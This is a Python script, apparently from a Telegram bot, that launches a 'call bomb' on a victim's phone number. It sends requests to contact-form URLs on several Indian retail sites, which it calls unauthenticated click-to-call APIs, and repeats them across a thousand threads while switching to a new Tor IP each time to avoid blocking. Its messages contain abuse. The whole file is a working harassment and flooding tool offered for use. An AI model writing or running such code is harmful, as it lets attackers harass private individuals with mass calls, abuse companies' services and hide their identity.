import requests
import threading
import time
from tor_manager import start_tor

# 🔥 List of vulnerable Indian click-to-call APIs (no auth, no rate limit)
TARGET_URLS = [
    "https://www.jiomart.com/contact_us/send_query?mobile=91{victim}&query=Hello",
    "https://www.bigbasket.com/customercare/contact-us/?mobile=91{victim}&msg=Hacked",
    "https://www.flipkart.com/api/1/query?mobile=91{victim}&text=Fuck+you",
    "https://www.myntra.com/service/contact?mobile=91{victim}&issue=spam",
]

def flood_call(victim):
    for url in TARGET_URLS * 1000:  # Repeat to reach volume
        try:
            start_tor()  # New Tor IP each time
            requests.get(url.format(victim=victim), timeout=3)
        except:
            pass  # Keep going

def launch_bomb(number, update):
    victim = number[2:]  # strip 91
    threads = []

    start = time.time()
    update.message.reply_text(f"🧨 INITIATING 1M CALL BOMB ON {number}...")

    # Launch 1000 threads
    for _ in range(1000):
        t = threading.Thread(target=flood_call, args=(victim,))
        t.start()
        threads.append(t)
        if _ % 100 == 0:
            time.sleep(1)

    # Wait 60 seconds, then die
    for t in threads:
        t.join(timeout=55)

    elapsed = time.time() - start
    update.message.reply_text(f"✅ Sent ~1,000,000 calls in {elapsed:.2f}s. Server self-destructing...")
